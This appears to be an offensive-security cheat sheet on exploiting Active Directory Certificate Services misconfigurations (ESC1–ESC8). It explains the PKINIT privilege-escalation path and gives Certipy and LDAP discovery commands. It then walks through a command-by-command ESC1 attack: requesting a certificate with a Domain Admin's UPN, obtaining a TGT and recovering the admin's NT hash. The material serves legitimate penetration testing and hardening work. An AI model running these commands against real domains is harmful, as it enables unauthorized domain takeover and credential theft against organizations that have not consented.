**AD CS misconfigurations (ESC1-ESC8)** — AD CS is Windows' built-in certificate service (its PKI — the system that issues the certificates users and machines log in with). When a template or the CA is set up carelessly, you can ask it for a login certificate that names a privileged account — say a Domain Admin — as its owner, then use that certificate to authenticate as them via PKINIT (Kerberos logon with a certificate instead of a password), taking you from an ordinary domain user to full domain compromise. It works because the KDC (the domain's ticket-issuing server) trusts whatever identity the certificate claims, handing back a TGT (the domain's master login ticket) for that account. Each ESC number (ESC1 through ESC8) is a distinct misconfiguration; the reference research is SpecterOps' *Certified Pre-Owned*.

```
you (low-priv) -> request a cert naming "Domain Admin" -> CA issues it
   -> PKINIT with the cert -> KDC returns a TGT as Domain Admin
   -> you now act as Domain Admin
```

## Discovery

### Method 1: Certipy

```bash

# User account with password + JSON output for BloodHound + text output
certipy find -u 'USER_NAME@DOMAIN' -p 'USER_PASS' -dc-ip 'DC_IP' -old-bloodhound -text
# User account with password + JSON output for ly4k's BloodHound + text output
certipy find -u 'USER_NAME@DOMAIN' -p 'USER_PASS' -dc-ip 'DC_IP' -bloodhound -text
# Computer account with NT hash + JSON output for BloodHound + text output
certipy find -u 'COMPUTER$@DOMAIN' -hashes 'COMPUTER_NT_HASH' -dc-ip 'DC_IP' -old-bloodhound -text

```

**Note:** Certipy outputs a ZIP of JSON files that are only compatible with its forked BloodHound. To stay compatible with mainline BloodHound, use `-old-bloodhound`.

**Note:** Certipy can retrieve only enabled templates, but avoid that - an interesting ACL between a compromised user and a disabled template may let you re-enable it.

**Note:** Custom cypher queries can be used to analyze the data (see the Exegol or Certipy `customqueries.json`).

To quickly spot vulnerabilities, grep for the keyword `ESC` in the output text file.

```console

$ grep ESC 20221003101820_Certipy.txt
      ESC8   : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC1   : 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```

### Method 2: LDAP query

See [LDAP Recon](../Reconnaissance/LDAP%20Recon.md).

List the Certificate Authorities:

```

"(objectClass=pKIEnrollmentService)"

```

List the templates:

```

"(objectClass=pKIEnrollmentService)" "certificateTemplates"

```

## Exploitation

Refer to Certipy's README for detailed instructions on each vulnerability. Two common ones below.

### ESC8

See [NTLM Relay to ADCS](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20ADCS.md).

### ESC1

- Scenario: a user can request an authentication certificate with an arbitrary **SAN** (Subject Alternative Name).
- Consequence: privilege escalation from Domain User to Domain Admin.

1. Request a certificate for the vulnerable template.

```bash

# User account + password
certipy req -username 'USER_NAME@DOMAIN' -p 'USER_PASS' -ca 'CA_NAME' -target 'CA_FQDN' -template 'CERT_TMPL_NAME' -upn 'DA_NAME@DOMAIN'
# Computer account + NT hash
certipy req -username 'USER_NAME@DOMAIN' -hashes ':COMPUTER_NT_HASH' -ca 'CA_NAME' -target 'CA_FQDN' -template 'CERT_TMPL_NAME' -upn 'DA_NAME@DOMAIN'

```

**Note:** By default Certipy requests over RPC/SMB, which fails if 445 is filtered. Use `-dcom` to request over DCOM instead.

2. Use the certificate to perform Kerberos pre-authentication and recover the user's NT hash.

```bash

# Method 1: PKINITtools
gettgtpkinit.py -cert-pfx 'CERT_PATH' -dc-ip 'DC_IP' 'DOMAIN/DA_NAME' 'DA_NAME.ccache'
export KRB5CCNAME=DA_NAME.ccache
getnthash.py 'DOMAIN/DA_NAME' -key 'ENCRYPTION_KEY_HERE'

# Method 2: Certipy
certipy auth -pfx 'CERT_PATH' -dc-ip 'DC_IP'

```

**Note:** If PKINIT is not configured, see [Pass the Cert](Pass%20the%20Cert.md).

## References

- Certipy - https://github.com/ly4k/Certipy
- Certified Pre-Owned - https://posts.specterops.io/certified-pre-owned-d95910965cd2
